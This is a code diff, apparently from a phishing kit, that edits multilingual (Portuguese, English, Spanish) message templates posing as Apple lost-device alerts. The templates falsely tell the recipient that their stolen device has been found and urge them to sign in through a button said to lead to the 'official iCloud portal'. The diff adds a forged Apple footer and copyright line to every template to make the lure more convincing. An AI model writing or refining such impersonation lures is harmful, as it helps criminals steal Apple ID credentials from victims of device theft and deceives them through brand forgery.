@@ -145,7 +145,9 @@ Detectamos a localização do seu *[MODELO_COMPLETO]*, marcado como Perdido/Roub
 Para visualizar os dados e *iniciar* o processo de recuperação de forma segura, acesse sua conta Apple:
 
 👇 Toque no *botão* abaixo para continuar com a verificação:
-(Você será redirecionado ao portal oficial iCloud)`;
+(Você será redirecionado ao portal oficial iCloud)
+>  Apple ID | Support |  Privacy Policy
+> Copyright © 2025 Apple Inc`;
 
 // Versões do texto padrão por idioma
 const defaultCardTemplateTextLang = {
@@ -158,7 +160,9 @@ We detected the location of your *[MODELO_COMPLETO]*, marked as Lost/Stolen.
 To view the data and *start* the recovery process securely, access your Apple account:
 
 👇 Tap the *button* below to continue verification:
-(You will be redirected to the official iCloud portal)`,
+(You will be redirected to the official iCloud portal)
+>  Apple ID | Support |  Privacy Policy
+> Copyright © 2025 Apple Inc`,
     es: `*🔔 ALERTA DE UBICACIÓN: Dispositivo Encontrado*
 
 Detectamos la ubicación de su *[MODELO_COMPLETO]*, marcado como Perdido/Robado.
@@ -167,7 +171,9 @@ Detectamos la ubicación de su *[MODELO_COMPLETO]*, marcado como Perdido/Robado.
 Para ver los datos e *iniciar* el proceso de recuperación de forma segura, acceda a su cuenta de Apple:
 
 👇 Toque el *botón* abajo para continuar con la verificación:
-(Será redirigido al portal oficial de iCloud)`
+(Será redirigido al portal oficial de iCloud)
+>  Apple ID | Support |  Privacy Policy
+> Copyright © 2025 Apple Inc`
 };
 
 // Idioma corrente do texto dos cartões (Português automático por padrão)
